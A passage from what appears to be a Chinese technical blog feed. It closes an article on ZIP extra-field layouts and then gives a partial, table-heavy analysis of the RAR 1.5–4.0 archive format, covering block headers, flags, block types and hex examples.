style="text-align:left">Description</th></tr></thead><tbody><tr><td style="text-align:left">0x0065</td><td style="text-align:center">2</td><td style="text-align:left">此“扩展”块类型的标签</td></tr><tr><td style="text-align:left">TSize</td><td style="text-align:center">2</td><td style="text-align:left">以下数据块的大小</td></tr><tr><td style="text-align:left">ID</td><td style="text-align:center">4</td><td style="text-align:left">EBCDIC“Z390” 0xE9F3F9F0或“T4MV”用于TargetFour</td></tr><tr><td style="text-align:left">(var)</td><td style="text-align:center">TSize-4</td><td style="text-align:left">属性数据（请参阅附录B）</td></tr></tbody></table><h4 id="2-5-14、-OS-400扩展字段-OS-400-Extra-Field-0x0065"><a href="#2-5-14、-OS-400扩展字段-OS-400-Extra-Field-0x0065" class="headerlink" title="2.5.14、-OS/400扩展字段(-OS/400 Extra Field)(0x0065)"></a>2.5.14、-OS/400扩展字段(-OS/400 Extra Field)(0x0065)</h4><p>以下是<code>OS/400扩展字段</code>的布局。<br><strong><code>注意:</code></strong>某些字段以<code>大端格式</code>存储。<br>除非另有说明，否则所有文本均为<code>EBCDIC</code>格式。</p><table><thead><tr><th style="text-align:left">Value</th><th style="text-align:center">Size(byte)</th><th style="text-align:left">Description</th></tr></thead><tbody><tr><td style="text-align:left">0x0065</td><td style="text-align:center">2</td><td style="text-align:left">此“扩展”块类型的标签</td></tr><tr><td style="text-align:left">TSize</td><td style="text-align:center">2</td><td style="text-align:left">以下数据块的大小</td></tr><tr><td style="text-align:left">ID</td><td style="text-align:center">4</td><td style="text-align:left">EBCDIC“I400” 0xC9F4F0F0或“T4MV”用于TargetFour</td></tr><tr><td style="text-align:left">(var)</td><td style="text-align:center">TSize-4</td><td style="text-align:left">属性数据（请参阅附录A）</td></tr></tbody></table><h4 id="2-5-15、-策略解密密钥记录扩展字段-Policy-Decryption-Key-Record-Extra-Field-0x0021"><a href="#2-5-15、-策略解密密钥记录扩展字段-Policy-Decryption-Key-Record-Extra-Field-0x0021" class="headerlink" title="2.5.15、-策略解密密钥记录扩展字段(-Policy Decryption Key Record Extra Field)(0x0021)"></a>2.5.15、-策略解密密钥记录扩展字段(-Policy Decryption Key Record Extra Field)(0x0021)</h4><p>&emsp;&emsp;以下是<code>策略解密密钥扩展块</code>的布局。<code>TData</code>是可变长度，可变内容字段。它包含有关<code>加密</code>和/或<code>加密密钥源</code>的信息。有关当前<code>TData结构</code>的信息，请与PKWARE联系。此<code>扩展块</code>中的信息也可以放在<code>注释字段</code>中。</p><table><thead><tr><th style="text-align:left">Value</th><th style="text-align:center">Size(byte)</th><th style="text-align:left">Description</th></tr></thead><tbody><tr><td style="text-align:left">0x0021</td><td style="text-align:center">2</td><td style="text-align:left">此“扩展”块类型的标签</td></tr><tr><td style="text-align:left">TSize</td><td style="text-align:center">2</td><td style="text-align:left">以下数据块的大小</td></tr><tr><td style="text-align:left">TData</td><td style="text-align:center">TSize</td><td style="text-align:left">密钥的数据</td></tr></tbody></table><h4 id="2-5-16、-密钥提供者记录扩展字段-Key-Provider-Record-Extra-Field-0x0022"><a href="#2-5-16、-密钥提供者记录扩展字段-Key-Provider-Record-Extra-Field-0x0022" class="headerlink" title="2.5.16、-密钥提供者记录扩展字段(-Key Provider Record Extra Field)(0x0022)"></a>2.5.16、-密钥提供者记录扩展字段(-Key Provider Record Extra Field)(0x0022)</h4><p>&emsp;&emsp;以下是<code>密钥提供者扩展块</code>的布局。<code>TData</code>是可变长度，可变内容字段。 它包含有关<code>加密</code>和/或<code>加密密钥源</code>的信息。有关当前<code>TData</code>结构的信息，请与PKWARE联系。此<code>扩展块</code>中的信息也可以放在<code>注释字段</code>中。</p><table><thead><tr><th style="text-align:left">Value</th><th style="text-align:center">Size(byte)</th><th style="text-align:left">Description</th></tr></thead><tbody><tr><td style="text-align:left">0x0022</td><td style="text-align:center">2</td><td style="text-align:left">此“扩展”块类型的标签</td></tr><tr><td style="text-align:left">TSize</td><td style="text-align:center">2</td><td style="text-align:left">以下数据块的大小</td></tr><tr><td style="text-align:left">TData</td><td style="text-align:center">TSize</td><td style="text-align:left">密钥的数据</td></tr></tbody></table><h4 id="2-5-17、-策略密钥数据记录记录扩展字段-Policy-Key-Data-Record-Record-Extra-Field-0x0023"><a href="#2-5-17、-策略密钥数据记录记录扩展字段-Policy-Key-Data-Record-Record-Extra-Field-0x0023" class="headerlink" title="2.5.17、-策略密钥数据记录记录扩展字段(-Policy Key Data Record Record Extra Field)(0x0023)"></a>2.5.17、-策略密钥数据记录记录扩展字段(-Policy Key Data Record Record Extra Field)(0x0023)</h4><p>&emsp;&emsp;以下是<code>策略密钥数据扩展块</code>的布局。<code>TData</code>是可变长度，可变内容字段。它包含有关<code>加密</code>和/或<code>加密密钥源</code>的信息。有关当前<code>TData</code>结构的信息，请与PKWARE联系。此扩展块中的信息也可以放在<code>注释字段</code>中。</p><table><thead><tr><th style="text-align:left">Value</th><th style="text-align:center">Size(byte)</th><th style="text-align:left">Description</th></tr></thead><tbody><tr><td style="text-align:left">0x0023</td><td style="text-align:center">2</td><td style="text-align:left">此“扩展”块类型的标签</td></tr><tr><td style="text-align:left">TSize</td><td style="text-align:center">2</td><td style="text-align:left">以下数据块的大小</td></tr><tr><td style="text-align:left">TData</td><td style="text-align:center">TSize</td><td style="text-align:left">密钥的数据</td></tr></tbody></table><hr><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p>[1] <a href="https://pkware.cachefly.net/webdocs/APPNOTE/APPNOTE-6.3.6.TXT" target="_blank" rel="noopener">官方文档 - APPNOTE-6.3.6.TXT</a></p>]]></content>
      
      <categories>
          
          <category> FileFormat </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>RAR文件格式分析</title>
      <link href="/2020/04/10/RAR%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E5%88%86%E6%9E%90/"/>
      <url>/2020/04/10/RAR%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E5%88%86%E6%9E%90/</url>
      <content type="html"><![CDATA[<blockquote><p>RAR文件格式分析<br>突然心血来潮，分析了一下这个格式，在家无法专心学习，一篇文章拖了挺长时间。<br>对RAR文件格式的细节有了更深刻的了解。<br><a id="more"></a></p></blockquote><hr><h2 id="1、RAR简介"><a href="#1、RAR简介" class="headerlink" title="1、RAR简介"></a>1、RAR简介</h2><blockquote><p><strong><code>wikipedia:</code></strong><br>1、<a href="https://en.wikipedia.org/wiki/RAR_(file_format" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/RAR_(file_format</a>)<br>2、<a href="https://www.loc.gov/preservation/digital/formats/fdd/fdd000450.shtml" target="_blank" rel="noopener">https://www.loc.gov/preservation/digital/formats/fdd/fdd000450.shtml</a></p></blockquote><p>&emsp;&emsp;RAR是一种专利文件格式，用于<code>数据压缩</code>与<code>归档打包</code>，开发者为<code>尤金·罗谢尔</code>（俄语：Евгений Лазаревич Рошал，拉丁转写：Yevgeny Lazarevich Roshal），RAR的全名是“<code>Roshal ARchive</code>”，即“罗谢尔的归档”之意。首个公开版本<code>RAR 1.3</code>发布于1993年。<br>&emsp;&emsp;尤金·罗谢尔，1972年3月10日生于<code>俄罗斯</code>。毕业于俄罗斯车里雅宾斯克工业大学（Chelyabinsk Technical University，今南乌拉州立大学），也是<code>FAR文件管理器</code>的作者。他开发程序压缩或解压RAR文件，最初用于DOS，后来移植到其它平台。主要的Windows版本编码器，称为WinRAR，以共享软件的形式发行。不过罗谢尔公开了解码器源码，UnRAR解码器许可证以不许发布编译RAR兼容编码器为条件下允许有条件自由发布与修改，而RAR编码器一直是有专利的。<br>&emsp;&emsp;最近的开发者是尤金·罗谢尔的胞兄<code>亚历山大·罗谢尔</code>。虽然其解码器有专利，编译好的解压程序仍然存在于若干平台，例如开源的7-Zip。<br>&emsp;&emsp;RAR同时也拥有成熟的加密算法，<code>2.0 版本前</code>加密算法未公开，<code>2.0 版本后</code>使用AES算法加密，在没有密码情况下目前只有<code>暴力破解</code>。</p><p><strong><code>文件特点：</code></strong></p><ul><li>RAR通常情况比ZIP压缩比高，但压缩／解压缩速度较慢。</li><li><strong>分卷压缩：</strong>压缩后分割为多个文件。</li><li><strong>固实压缩：</strong>将要压缩的文件视为同一个文件以加大压缩比，代价是取用压缩包中任何文件需要解压整个压缩包。</li><li><strong>恢复记录：</strong>加入冗余数据用于修复，在压缩包本身损坏但恢复记录够多时可对损坏压缩包进行恢复。</li><li><strong>加密：</strong>RAR 2.0使用AES-128-CBC，RAR5.0以后为AES-256-CBC。之前RAR的加密算法为私有。当前除了暴力破解之外不存在（至少没有公开）有效的破解方法。</li></ul><h3 id="1-1、RAR的历史版本"><a href="#1-1、RAR的历史版本" class="headerlink" title="1.1、RAR的历史版本"></a>1.1、RAR的历史版本</h3><p>RAR文件格式的<code>修订历史记录</code>：</p><ul><li><strong><code>1.3</code></strong> 第一个公开版本，没有“ Rar！” 签名。</li><li><strong><code>1.5</code></strong> 更改未知。</li><li><strong><code>2.0</code></strong> 与WinRAR 2.0和Rar一起发布，用于MS-DOS 2.0。</li><li><strong><code>2.9</code></strong> 在WinRAR版本3.00中发布。</li><li><strong><code>5.0</code></strong> WinRAR 5.0及更高版本支持。</li></ul><p>WinRAR 5.0和Android的RAR将<code>2.9版本</code>称为<code>RAR4</code>。</p><hr><h2 id="2、RAR压缩文件格式分析"><a href="#2、RAR压缩文件格式分析" class="headerlink" title="2、RAR压缩文件格式分析"></a>2、RAR压缩文件格式分析</h2><h3 id="2-1、RAR-1-5-4-0文件格式分析"><a href="#2-1、RAR-1-5-4-0文件格式分析" class="headerlink" title="2.1、RAR 1.5 - 4.0文件格式分析"></a>2.1、RAR 1.5 - 4.0文件格式分析</h3><blockquote><p><strong><code>参考资料：</code></strong><br>1、<a href="http://acritum.com/winrar/rar-format" target="_blank" rel="noopener">http://acritum.com/winrar/rar-format</a><br>2、<a href="https://forensicswiki.xyz/page/RAR" target="_blank" rel="noopener">https://forensicswiki.xyz/page/RAR</a><br>3、<a href="https://blog.csdn.net/howeverpf/article/details/8909362" target="_blank" rel="noopener">https://blog.csdn.net/howeverpf/article/details/8909362</a><br>4、<a href="https://codedread.github.io/bitjs/docs/unrar.html" target="_blank" rel="noopener">https://codedread.github.io/bitjs/docs/unrar.html</a></p></blockquote><p><strong><code>实例环境：</code></strong> </p><div align="left"><img src="/resources/2020/RAR_Format/SimpleRAR_env0.jpg" width="50%" height="50%" alt="例子RAR文件环境0"></div><br><div align="left"><img src="/resources/2020/RAR_Format/SimpleRAR_env1.jpg" width="70%" height="50%" alt="例子RAR文件环境1"></div><p>&emsp;&emsp;压缩文件由<code>可变长度</code>的块组成。这些<code>块的顺序</code>可以变化，但是第一个块必须是<code>标记块</code>，然后是<code>压缩文件头块</code>。</p><p>&emsp;&emsp;现在公开的块类型有：<code>标记块</code>，<code>压缩文件头块</code>，<code>文件头块</code>，<code>注释头块</code>，<code>用户身份信息块</code>，<code>子块</code>和<code>恢复记录块</code>等。每一块的开始是由通用字段开始，且每一个不同的块的通用字段结构都是一样的。 </p><p><code>通用字段结构</code>如下表：</p><table><thead><tr><th style="text-align:left">字段名称</th><th style="text-align:center">长度(byte)</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">HEAD_CRC</td><td style="text-align:center">2</td><td style="text-align:left">所有块或块部分的CRC</td></tr><tr><td style="text-align:left">HEAD_TYPE</td><td style="text-align:center">1</td><td style="text-align:left">块类型</td></tr><tr><td style="text-align:left">HEAD_FLAGS</td><td style="text-align:center">2</td><td style="text-align:left">块标记</td></tr><tr><td style="text-align:left">HEAD_SIZE</td><td style="text-align:center">2</td><td style="text-align:left">块大小</td></tr></tbody></table><p>如果块标记的第一位被置1的话(<code>(HEAD_FLAGS &amp; 0x8000)!= 0</code>)还存在：</p><table><thead><tr><th style="text-align:left">字段名称</th><th style="text-align:center">长度(byte)</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">ADD_SIZE</td><td style="text-align:center">4</td><td style="text-align:left">可选结构 - 增加块大小</td></tr></tbody></table><p>&emsp;&emsp;所以文件大小的计算分两种情况，当块标记<code>HEAD_FLAGS</code>首位未置1，则总块大小就是<code>HEAD_SIZE</code>，当块标记<code>HEAD_FLAGS</code>首位置1，可选结构<code>ADD_SIZE</code>存在，则总块大小为<code>HEAD_SIZE</code>+<code>ADD_SIZE</code>。</p><p>&emsp;&emsp;在每个块中，<code>HEAD_FLAGS</code>中的以下位具有相同的含义：</p><blockquote><p><code>0x4000</code> - 如果设置，则较旧的RAR版本将忽略该块，并在更新存档时将其删除。如果清除，则在更新存档时将此块复制到新的存档文件；<br><code>0x8000</code> - 如果设置，则存在ADD_SIZE字段，且完整块大小为HEAD_SIZE + ADD_SIZE。</p></blockquote><p><strong><code>块类型：</code></strong></p><blockquote><ul><li><code>HEAD_TYPE = 0x72</code>  - MARK_HEAD(标记块)</li><li><code>HEAD_TYPE = 0x73</code>  - MAIN_HEAD(压缩文件头)</li><li><code>HEAD_TYPE = 0x74</code>  - FILE_HEAD(文件头)</li><li><code>HEAD_TYPE = 0x75</code>  - COMM_HEAD(旧风格的注释头)</li><li><code>HEAD_TYPE = 0x76</code>  - AV_HEAD(旧风格的授权信息块/用户身份信息块)</li><li><code>HEAD_TYPE = 0x77</code>  - SUB_HEAD(旧风格的子块)</li><li><code>HEAD_TYPE = 0x78</code>  -     PROTECT_HEAD(旧风格的恢复记录)</li><li><code>HEAD_TYPE = 0x79</code>  - SIGN_HEAD(旧风格的授权信息块/用户身份信息块)</li><li><code>HEAD_TYPE = 0x7A</code>  - NEWSUB_HEAD(子块)</li><li><code>HEAD_TYPE = 0x7B</code>  - ENDARC_HEAD(结束块)</li></ul></blockquote><h4 id="2-1-1、标记块-MARK-HEAD"><a href="#2-1-1、标记块-MARK-HEAD" class="headerlink" title="2.1.1、标记块( MARK_HEAD )"></a>2.1.1、标记块( MARK_HEAD )</h4><table><thead><tr><th style="text-align:left">字段名称</th><th style="text-align:center">长度(byte)</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">HEAD_CRC</td><td style="text-align:center">2</td><td style="text-align:left">总是0x6152</td></tr><tr><td style="text-align:left">HEAD_TYPE</td><td style="text-align:center">1</td><td style="text-align:left">0x72</td></tr><tr><td style="text-align:left">HEAD_FLAGS</td><td style="text-align:center">2</td><td style="text-align:left">总是0x1A21</td></tr><tr><td style="text-align:left">HEAD_SIZE</td><td style="text-align:center">2</td><td style="text-align:left">块大小 = 0x0007,即7个字节</td></tr></tbody></table><p>&emsp;&emsp;所以这里标记块的大小固定是7 个字节，且是一个固定的字节序列。<code>标记块</code>也称为<code>Magic number</code>。</p><p><strong><code>实例：</code></strong><br><img src="/resources/2020/RAR_Format/MARK_HEAD.jpg" alt="标记块"></p><h4 id="2-1-2、压缩文件头-MAIN-HEAD"><a href="#2-1-2、压缩文件头-MAIN-HEAD" class="headerlink" title="2.1.2、压缩文件头( MAIN_HEAD )"></a>2.1.2、压缩文件头( MAIN_HEAD )</h4><table><thead><tr><th style="text-align:left">字段名称</th><th style="text-align:center">长度(byte)</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">HEAD_CRC</td><td style="text-align:center">2</td><td style="text-align:left">HEAD_TYPE到RESERVED2的CRC</td></tr><tr><td style="text-align:left">HEAD_TYPE</td><td style="text-align:center">1</td><td style="text-align:left">0x73</td></tr><tr><td style="text-align:left">HEAD_FLAGS</td><td style="text-align:center">2</td><td style="text-align:left">位标记：<br> <code>0x0001</code> - MHD_VOLUME: 卷属性(压缩文件卷) <br> <code>0x0002</code> - MHD_COMMENT: 压缩文件注释存在，RAR 3.x使用单独的注释块，不设置这个标记。 <br> <code>0x0004</code> - MHD_LOCK: 压缩文件锁定属性 <br> <code>0x0008</code> - MHD_SOLID: 固实属性(固实压缩文件) <br> <code>0x0010</code> - MHD_NEWNUMBERING: 新的卷命名法则(‘volname.partN.rar’) <br> <code>0x0020</code> - MHD_AV: 用户身份信息存在，RAR 3.x使用单独的用户身份信息块，不设置这个标记。 <br> <code>0x0040</code> - MHD_PROTECT: 恢复记录存在 <br> <code>0x0080</code> - HD_PASSWORD: 块头被加密 <br> <code>0x0100</code> - MHD_FIRSTVOLUME: 第一卷(只有RAR3.0及以后版本设置) <br> <code>0x0200</code> - MHD_ENCRYPTVER: <br> HEAD_FLAGS中的其他位保留用于内部使用。</td></tr><tr><td style="text-align:left">HEAD_SIZE</td><td style="text-align:center">2</td><td style="text-align:left">压缩文件头总大小（包括压缩文件注释）</td></tr><tr><td style="text-align:left">RESERVED1</td><td style="text-align:center">2</td><td style="text-align:left">保留</td></tr><tr><td style="text-align:left">RESERVED2</td><td style="text-align:center">4</td><td style="text-align:left">保留</td></tr></tbody></table><p>&emsp;&emsp;对于<code>压缩文件头</code>里的<code>位标记</code>，如果它的第9位(从左到右)被置1，块头被加密，也就是通常所说的<code>加密文件名</code>，打开这样加密的RAR文件时，需要先输入密码才能看到压缩包内的文件列表。</p><p><strong><code>实例：</code></strong><br><img src="/resources/2020/RAR_Format/MAIN_HEAD.jpg" alt="压缩文件头"></p><p>&emsp;&emsp;这里头类型是0x73表示是<code>压缩文件头块</code>，位标记为0x0000未有位被置1，如果<code>块头被加密</code>则位标记应为0x0080，<code>文件头大小</code>为0x000D，所以这个<code>压缩文件头块</code>占用13 个字节，保留字节用0x00 填充。</p><h4 id="2-1-3、文件头-FILE-HEAD"><a href="#2-1-3、文件头-FILE-HEAD" class="headerlink" title="2.1.3、文件头( FILE_HEAD )"></a>2.1.3、文件头( FILE_HEAD )</h4><table><thead><tr><th style="text-align:left">字段名称</th><th style="text-align:center">&nbsp; 长度(byte) &nbsp;</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">HEAD_CRC</td><td style="text-align:center">2</td><td style="text-align:left">从HEAD_TYPE到FILEATTR的CRC</td></tr><tr><td style="text-align:left">HEAD_TYPE</td><td style="text-align:center">1</td><td style="text-align:left">0x74</td></tr><tr><td style="text-align:left">HEAD_FLAGS</td><td style="text-align:center">2</td><td style="text-align:left">位标记: <br> <code>0x0001</code> - LHD_SPLIT_BEFORE: 文件从上一卷继续 <br> <code>0x0002</code> - LHD_SPLIT_AFTER: 文件从后一卷继续 <br> <code>0x0004</code> - LHD_PASSWORD: 文件使用密码加密 <br> <code>0x0008</code> - LHD_COMMENT: 文件注释存在，RAR 3.x使用独立的注释块，不设置这个标记。 <br> <code>0x0010</code> - LHD_SOLID: 前一文件信息被使用(固实标记) (对于RAR 2.0 和以后版本) <br> &emsp;&emsp;7 6 5 位(对于RAR 2.0和以后版本) <br> &emsp;&emsp;0 0 0 - 字典大小 64KB <br> &emsp;&emsp;0 0 1 - 字典大小 128KB <br> &emsp;&emsp;0 1 0 - 字典大小 256KB <br> &emsp;&emsp;0 1 1 - 字典大小 512KB <br> &emsp;&emsp;1 0 0 - 字典大小 1024KB <br> &emsp;&emsp;1 0 1 - 字典大小 2048KB <br> &emsp;&emsp;1 1 0 - 字典大小 4096KB <br> &emsp;&emsp;1 1 1 - 文件作为字典 <br> <code>0x0100</code> - LHD_LARGE: HIGH_PACK_SIZE和HIGH_UNP_SIZE结构存在。这些结构仅用在非常大(大于2GB)的文档，对于小文件这些结构不存在。 <br> <code>0x0200</code> - LHD_UNICODE: FILE_NAME是用0隔开的包含普通的和Unicode编码的文件名。所以NAME_SIZE字段的值等于普通文件名的长度加Unicode编码文件名的长度再加1。如果此标记存在，但是FILE_NAME不包含0字节，它意味文件名使用UTF-8编码。 <br> <code>0x0400</code> - LHD_SALT: 文件头在文件名后包含附加的8byte，它对于增加加密的安全性是必需的。(所谓的’Salt’)。 <br> <code>0x0800</code> - LHD_VERSION: 版本标记。它是旧文件版本，版本号作为’;n’附加到文件名后。 <br> <code>0x1000</code> - LHD_EXTTIME: 扩展时间区域存在。  <br> <code>0x2000</code> - LHD_EXTFLAGS: <br> <code>0x8000</code> - 此位总被设置，所以完整的块的大小是HEAD_SIZE + PACK_SIZE(如果<code>0x100</code>位被设置，再加上HIGH_PACK_SIZE)</td></tr><tr><td style="text-align:left">HEAD_SIZE</td><td style="text-align:center">2</td><td style="text-align:left">文件头的全部大小(包含文件名和注释)</td></tr><tr><td style="text-align:left">PACK_SIZE</td><td style="text-align:center">4</td><td style="text-align:left">已压缩文件大小</td></tr><tr><td style="text-align:left">UNP_SIZE</td><td style="text-align:center">4</td><td style="text-align:left">未压缩文件大小</td></tr><tr><td style="text-align:left">HOST_OS</td><td style="text-align:center">1</td><td style="text-align:left">保存压缩文件使用的操作系统 <br> <code>0x00</code> - MS DOS <br> <code>0x01</code> - OS/2 <br> <code>0x02</code> - Win32 <br> <code>0x03</code> - Unix <br> <code>0x04</code> - Mac OS <br> <code>0x05</code> - BeOS</td></tr><tr><td style="text-align:left">FILE_CRC</td><td style="text-align:center">4</td><td style="text-align:left">文件CRC</td></tr><tr><td style="text-align:left">FTIME</td><td style="text-align:center">4</td><td style="text-align:left">MS DOS标准格式的日期和时间</td></tr><tr><td style="text-align:left">UNP_VER</td><td style="text-align:center">1</td><td style="text-align:left">解压文件所需要最低RAR版本，版本编码方法：10 * 主版本 + 副版本。</td></tr><tr><td style="text-align:left">METHOD</td><td style="text-align:center">1</td><td style="text-align:left">压缩方式： <br> <code>0x30</code> - 存储 <br> <code>0x31</code> - 最快压缩 <br> <code>0x32</code> - 较快压缩 <br> <code>0x33</code> - 标准压缩 <br> <code>0x34</code> - 较好压缩 <br> <code>0x35</code> - 最好压缩</td></tr><tr><td style="text-align:left">NAME_SIZE</td><td style="text-align:center">2</td><td style="text-align:left">文件名大小</td></tr><tr><td style="text-align:left">ATTR</td><td style="text-align:center">4</td><td style="text-align:left">文件属性</td></tr><tr><td style="text-align:left">HIGH_PACK_SIZE</td><td style="text-align:center">4</td><td style="text-align:left">可选值，<code>已压缩文件大小</code>64位值的高4字节。只HEAD_FLAGS中的<code>0x100</code>位被设置才存在。</td></tr><tr><td style="text-align:left">HIGH_UNP_SIZE</td><td style="text-align:center">4</td><td style="text-align:left">可选值，<code>未压缩文件大小</code>64位值的高4字节。只有HEAD_FLAGS中的<code>0x100</code>位被设置才存在。</td></tr><tr><td style="text-align:left">FILE_NAME</td><td style="text-align:center">NAME_SIZE</td><td style="text-align:left">文件名 - NAME_SIZE字节大小字符串</td></tr><tr><td style="text-align:left">SALT</td><td style="text-align:center">8</td><td style="text-align:left">可选值，如果(HEAD_FLAGS &amp; 0x400)!= 0，则存在</td></tr><tr><td style="text-align:left">EXT_TIME</td><td style="text-align:center">可变大小</td><td style="text-align:left">可选值，扩展时间区域，如果(HEAD_FLAGS &amp; 0x1000)!= 0，则存在</td></tr></tbody></table><p><strong><code>实例1：</code></strong><br><img src="/resources/2020/RAR_Format/FILE_HEAD.jpg" alt="文件头1"></p><p><strong><code>实例2：</code></strong><br><img src="/resources/2020/RAR_Format/FILE_HEAD1.jpg" alt="文件头2"></p><p>&emsp;&emsp;在这个块中，存在<code>两个CRC值</code>，一个是文件头块中从<code>块类型</code>到<code>文件名</code>这38(实例1)或40(实例2)个字节的校验，后一个则是压缩包中所含<code>文件的CRC校验</code>，解压时，会计算解压后生成文件的CRC值，如果等于这里的CRC，则解压完成，如果不同，则报错中断。<br>&emsp;&emsp;位标记<code>0x9020</code>(10010000 00100000B) = 0x0020 || 0x1000 || 0x8000，<code>0x0020</code>(字典大小 128KB)、<code>0x1000</code>(扩展时间区域存在)、<code>0x8000</code>(此位总被设置)。</p><h4 id="2-1-4、结尾块-ENDARC-HEAD"><a href="#2-1-4、结尾块-ENDARC-HEAD" class="headerlink" title="2.1.4、结尾块( ENDARC_HEAD )"></a>2.1.4、结尾块( ENDARC_HEAD )</h4><table><thead><tr><th style="text-align:left">字段名称</th><th style="text-align:center">长度(byte)</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">HEAD_CRC</td><td style="text-align:center">2</td><td style="text-align:left">从HEAD_TYPE 到HEAD_SIZE 的CRC校验值</td></tr><tr><td style="text-align:left">HEAD_TYPE</td><td style="text-align:center">1</td><td style="text-align:left">0x7B</td></tr><tr><td style="text-align:left">HEAD_FLAGS</td><td style="text-align:center">2</td><td style="text-align:left">位标记</td></tr><tr><td style="text-align:left">HEAD_SIZE</td><td style="text-align:center">2</td><td style="text-align:left">结尾块大小</td></tr></tbody></table><p>&emsp;&emsp;与标记块类似的是，<code>结尾块</code>也是一个固定字节串的块，依次是<code>C4 3D 7B 00 40 07 00</code>。</p><p><strong><code>实例：</code></strong><br><img src="/resources/2020/RAR_Format/END_HEAD.jpg" alt="结尾块"></p><p>&emsp;&emsp;<code>前一个文件块起始位置偏移</code>为81，而<code>前一个文件块的大小</code>是HEAD_SIZE + PACK_SIZE(0x002F + 0x153A = 0x1569) = 5481byte。所以<code>结尾块的偏移</code>为5481 + 81 = 5562。</p><h4 id="2-1-5、旧风格的块类型"><a href="#2-1-5、旧风格的块类型" class="headerlink" title="2.1.5、旧风格的块类型"></a>2.1.5、旧风格的块类型</h4><p>&emsp;&emsp; 除以上格式块以外，还存在一些旧风格的块类型，不过在新的版本中已经不存在了。</p><p><strong><code>旧风格的注释头块：</code></strong></p><table><thead><tr><th style="text-align:left">字段名称</th><th style="text-align:center">长度(byte)</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">HEAD_CRC</td><td style="text-align:center">2</td><td style="text-align:left">从HEAD_TYPE 到COMM_CRC 的CRC校验值</td></tr><tr><td style="text-align:left">HEAD_TYPE</td><td style="text-align:center">1</td><td style="text-align:left">0x75</td></tr><tr><td style="text-align:left">HEAD_FLAGS</td><td style="text-align:center">2</td><td style="text-align:left">位标记</td></tr><tr><td style="text-align:left">HEAD_SIZE</td><td style="text-align:center">2</td><td style="text-align:left">注释头大小</td></tr><tr><td style="text-align:left">UNP_SIZE</td><td style="text-align:center">2</td><td style="text-align:left">未压缩注释大小</td></tr><tr><td style="text-align:left">UNP_VER</td><td style="text-align:center">1</td><td style="text-align:left">提取注释的RAR最低版本</td></tr><tr><td style="text-align:left">METHOD</td><td style="text-align:center">1</td><td style="text-align:left">压缩方法</td></tr><tr><td style="text-align:left">COMM_CRC</td><td style="text-align:center">2</td><td style="text-align:left">注释CRC</td></tr><tr><td style="text-align:left">COMMENT</td><td style="text-align:center">N</td><td style="text-align:left">注释正文</td></tr></tbody></table><p><strong><code>旧风格的授权信息块/用户身份信息块：</code></strong></p><table><thead><tr><th style="text-align:left">字段名称</th><th style="text-align:center">长度(byte)</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">HEAD_CRC</td><td style="text-align:center">2</td><td style="text-align:left">从HEAD_TYPE 到HEAD_SIZE的CRC校验值</td></tr><tr><td style="text-align:left">HEAD_TYPE</td><td style="text-align:center">1</td><td style="text-align:left">0x76</td></tr><tr><td style="text-align:left">HEAD_FLAGS</td><td style="text-align:center">2</td><td style="text-align:left">位标记</td></tr><tr><td style="text-align:left">HEAD_SIZE</td><td style="text-align:center">2</td><td style="text-align:left">块大小</td></tr><tr><td style="text-align:left">INFO</td><td style="text-align:center">N</td><td style="text-align:left">授权信息/用户身份信息正文</td></tr></tbody></table><p><strong><code>旧风格的子块：</code></strong><br>&emsp;&emsp; 在压缩文件中<code>任意文件头块</code>后面都可以附加一个<code>子块</code>。这个子块依赖于它前面的这个<code>主块</code>。当更新时新版本的RAR压缩包可能会删除或者移动这个子块。</p><table><thead><tr><th style="text-align:left">字段名称</th><th style="text-align:center">长度(byte)</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">HEAD_CRC</td><td style="text-align:center">2</td><td style="text-align:left">块CRC</td></tr><tr><td style="text-align:left">HEAD_TYPE</td><td style="text-align:center">1</td><td style="text-align:left">0x77</td></tr><tr><td style="text-align:left">HEAD_FLAGS</td><td style="text-align:center">2</td><td style="text-align:left">位标记</td></tr><tr><td style="text-align:left">HEAD_SIZE</td><td style="text-align:center">2</td><td style="text-align:left">总块大小</td></tr><tr><td style="text-align:left">DATA_SIZE</td><td style="text-align:center">4</td><td style="text-align:left">总数据块大小</td></tr><tr><td style="text-align:left">SUB_TYPE</td><td style="text-align:center">2</td><td style="text-align:left">子块类型</td></tr><tr><td style="text-align:left">RESERVED</td><td style="text-align:center">1</td><td style="text-align:left">保留字段，必须为0</td></tr><tr><td style="text-align:left">其余字段</td><td style="text-align:center"></td><td style="text-align:left">由SUB_TYPE 决定其余字段类型</td></tr></tbody></table><p>&emsp;&emsp; 以<code>SUB_TYPE</code>为0x100为例，0x100定义子块类型为<code>扩展属性类型</code>，一般用于压缩一些文件属性信息较详细的文件。</p><table><thead><tr><th style="text-align:left">字段名称</th><th style="text-align:center">长度(byte)</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">HEAD_CRC</td><td style="text-align:center">2</td><td style="text-align:left">块CRC</td></tr><tr><td style="text-align:left">HEAD_TYPE</td><td style="text-align:center">1</td><td style="text-align:left">0x77</td></tr><tr><td style="text-align:left">HEAD_FLAGS</td><td style="text-align:center">2</td><td style="text-align:left">位标记</td></tr><tr><td style="text-align:left">HEAD_SIZE</td><td style="text-align:center">2</td><td style="text-align:left">总块大小</td></tr><tr><td style="text-align:left">DATA_SIZE</td><td style="text-align:center">4</td><td style="text-align:left">总数据块大小</td></tr><tr><td style="text-align:left">SUB_TYPE</td><td style="text-align:center">2</td><td style="text-align:left">子块类型，定义子块为扩展属性类型</td></tr><tr><td style="text-align:left">RESERVED</td><td style="text-align:center">1</td><td style="text-align:left">保留字段，必须为0。以上为子块中固定格式</td></tr><tr><td style="text-align:left">UNP_SIZE</td><td style="text-align:center">4</td><td 